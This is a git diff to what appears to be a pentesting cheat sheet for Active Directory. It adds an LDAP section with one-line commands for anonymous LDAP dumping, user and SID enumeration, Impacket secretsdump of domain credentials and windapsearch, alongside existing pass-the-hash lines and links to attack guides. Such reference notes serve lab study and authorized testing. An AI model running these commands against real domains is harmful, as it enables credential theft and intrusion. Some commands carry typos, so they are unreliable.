@@ -38,6 +38,31 @@ Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't ne
 
     evi-winrm -i 127.0.0.1 -u username -H [NTLM hash]        
 
+
+## LDAP (Port 636)
+Anonymous Credential LDAP Dumping: 
+
+    ldapsearch -LLL -x -H ldap://<domain fqdn> -b ‘’ -s base ‘(objectclass=*)’
+
+Impacket GetADUsers.py (Must have valid credentials)
+
+    GetADUsers.py -all <domain\User> -dc-ip <DC_IP>
+
+Impacket lookupsid.py:
+
+    /usr/share/doc/python3-impacket/examples/lookupsid.py username:password@172.21.0.0
+
+Impacket Secretdump:
+
+    python3 secretdump.py 'breakme.local/Administrator@172.21.0.0' -just-dc-user anakin
+
+Windapsearch:
+
+https://github.com/ropnop/windapsearch 
+
+    python3 windapsearch.py -d host.domain -u domain\\ldapbind -p PASSWORD -U
+
+
 ## Post Exploitation    
 ### PowerView   
 Powershell script to enum domain after gaining admin access to machine   
@@ -69,6 +94,8 @@ on victim, transfer file then import into Bloodhound and run queries
 # Resources
 [Understanding Windows Lateral Movement](https://attl4s.github.io/assets/pdf/Understanding_Windows_Lateral_Movements.pdf)  
 
+[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise)
 
+[Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)
 
 
